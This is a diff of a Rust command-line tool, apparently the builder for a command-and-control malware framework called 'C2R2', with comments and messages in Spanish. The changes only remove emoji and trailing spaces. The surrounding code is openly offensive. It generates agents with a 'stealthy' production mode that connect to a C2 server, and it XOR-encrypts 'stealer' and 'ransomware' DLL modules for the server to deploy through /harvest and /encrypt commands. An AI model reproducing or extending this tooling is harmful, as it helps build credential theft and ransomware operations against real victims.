@@ -24,16 +24,16 @@ enum Commands {
         /// Nombre del agente generado (sin extensión .exe)
         #[arg(short, long)]
         name: String,
-        
+
         /// Servidor C2 (IP:Puerto)
         #[arg(short, long, default_value = "127.0.0.1:4444")]
         server: String,
-        
+
         /// Modo producción (sin consola, sin debug prints, totalmente stealthy)
         #[arg(short, long)]
         production: bool,
     },
-    
+
     /// Encripta un módulo DLL para ser usado por el agente
     EncryptModule {
         /// Módulo a encriptar (stealer o ransomware)
@@ -47,35 +47,35 @@ fn main() {
 
     match args.command {
         Commands::BuildAgent { name, server, production } => {
-            println!("🔧 C2R2 Agent Builder v2.0");
-            println!("🏷️  Agente: {}", name);
-            println!("🌐 Servidor C2: {}", server);
-            println!("🔒 Modo: {}", if production { "PRODUCCIÓN (stealthy)" } else { "DESARROLLO (debug)" });
+            println!(" C2R2 Agent Builder v2.0");
+            println!("  Agente: {}", name);
+            println!(" Servidor C2: {}", server);
+            println!(" Modo: {}", if production { "PRODUCCIÓN (stealthy)" } else { "DESARROLLO (debug)" });
             println!("{}", "-".repeat(50));
-            
+
             match generate_agent(&name, &server, production) {
                 Ok(_) => {
-                    println!("✅ Agente generado exitosamente: {}.exe", name);
+                    println!(" Agente generado exitosamente: {}.exe", name);
                 }
                 Err(e) => {
-                    eprintln!("❌ Error: {}", e);
+                    eprintln!(" Error: {}", e);
                     std::process::exit(1);
                 }
             }
         }
-        
+
         Commands::EncryptModule { module } => {
-            println!("🔧 C2R2 Module Encryptor v2.0");
-            println!("📦 Módulo: {}", module);
+            println!(" C2R2 Module Encryptor v2.0");
+            println!(" Módulo: {}", module);
             println!("{}", "-".repeat(50));
-            
+
             // Validar módulo
             if module != "stealer" && module != "ransomware" {
-                eprintln!("❌ Error: Módulo desconocido '{}'", module);
+                eprintln!(" Error: Módulo desconocido '{}'", module);
                 eprintln!("   Módulos disponibles: stealer, ransomware");
                 std::process::exit(1);
             }
-            
+
             // Obtener el directorio raíz del workspace (desde CARGO_MANIFEST_DIR o current_dir)
             let workspace_root = if let Ok(manifest_dir) = env::var("CARGO_MANIFEST_DIR") {
                 // Ejecutado con cargo run, manifest_dir apunta a builder/
@@ -92,23 +92,23 @@ fn main() {
                         }
                     }
                     if !current.pop() {
-                        eprintln!("❌ Error: No se encontró el directorio raíz del workspace");
+                        eprintln!(" Error: No se encontró el directorio raíz del workspace");
                         std::process::exit(1);
                     }
                 }
                 current
             };
-            
+
             // Buscar DLL en target de Windows (cross-compilation desde Linux)
             let dll_path_win = workspace_root.join(format!("target/x86_64-pc-windows-gnu/release/{}.dll", module));
             let dll_path_native = workspace_root.join(format!("target/release/{}.dll", module));
-            
+
             let dll_path = if dll_path_win.exists() {
                 dll_path_win
             } else if dll_path_native.exists() {
                 dll_path_native
             } else {
-                eprintln!("❌ Error: No se encontró {}.dll", module);
+                eprintln!(" Error: No se encontró {}.dll", module);
                 eprintln!("   Ejecuta primero:");
                 eprintln!("   cargo build --release --target x86_64-pc-windows-gnu --package {}-dll", module);
                 eprintln!();
@@ -117,49 +117,49 @@ fn main() {
                 eprintln!("   - {}", dll_path_native.display());
                 std::process::exit(1);
             };
-            
-            println!("📂 DLL encontrada: {}", dll_path.display());
-            
+
+            println!(" DLL encontrada: {}", dll_path.display());
+
             let output_enc = workspace_root.join(format!("c2r2-server/modules/{}.enc", module));
             let output_key = workspace_root.join(format!("c2r2-server/modules/{}.key", module));
-            
+
             // Crear directorio modules si no existe
             if let Some(parent) = output_enc.parent() {
                 if !parent.exists() {
                     if let Err(e) = std::fs::create_dir_all(parent) {
-                        eprintln!("❌ Error creando directorio modules/: {}", e);
+                        eprintln!(" Error creando directorio modules/: {}", e);
                         std::process::exit(1);
                     }
                 }
             }
-            
+
             // Generar clave XOR aleatoria de 32 bytes
             let xor_key = generate_random_key(32);
-            
-            println!("\n📦 Encriptando {}.dll...", module);
+
+            println!("\n Encriptando {}.dll...", module);
             match encrypt_dll(&dll_path, &output_enc, &xor_key) {
-                Ok(_) => println!("✅ DLL encriptada: {}", output_enc.display()),
+                Ok(_) => println!(" DLL encriptada: {}", output_enc.display()),
                 Err(e) => {
-                    eprintln!("❌ Error encriptando DLL: {}", e);
+                    eprintln!(" Error encriptando DLL: {}", e);
                     std::process::exit(1);
                 }
             }
-            
+
             // Guardar clave
             if let Err(e) = std::fs::write(&output_key, &xor_key) {
-                eprintln!("❌ Error guardando clave: {}", e);
+                eprintln!(" Error guardando clave: {}", e);
                 std::process::exit(1);
             }
-            println!("🔑 Clave guardada: {} ({} bytes)", output_key.display(), xor_key.len());
-            
-            println!("\n📋 Archivos generados:");
+            println!(" Clave guardada: {} ({} bytes)", output_key.display(), xor_key.len());
+
+            println!("\n Archivos generados:");
             println!("   - {}", output_enc.display());
             println!("   - {}", output_key.display());
-            
+
             if module == "stealer" {
-                println!("\nℹ️  Ahora puedes usar /harvest en el C2 para ejecutar el stealer");
+                println!("\nℹ  Ahora puedes usar /harvest en el C2 para ejecutar el stealer");
             } else if module == "ransomware" {
-                println!("\nℹ️  Ahora puedes usar /encrypt o /decrypt en el C2 para usar el ransomware");
+                println!("\nℹ  Ahora puedes usar /encrypt o /decrypt en el C2 para usar el ransomware");
             }
         }
     }
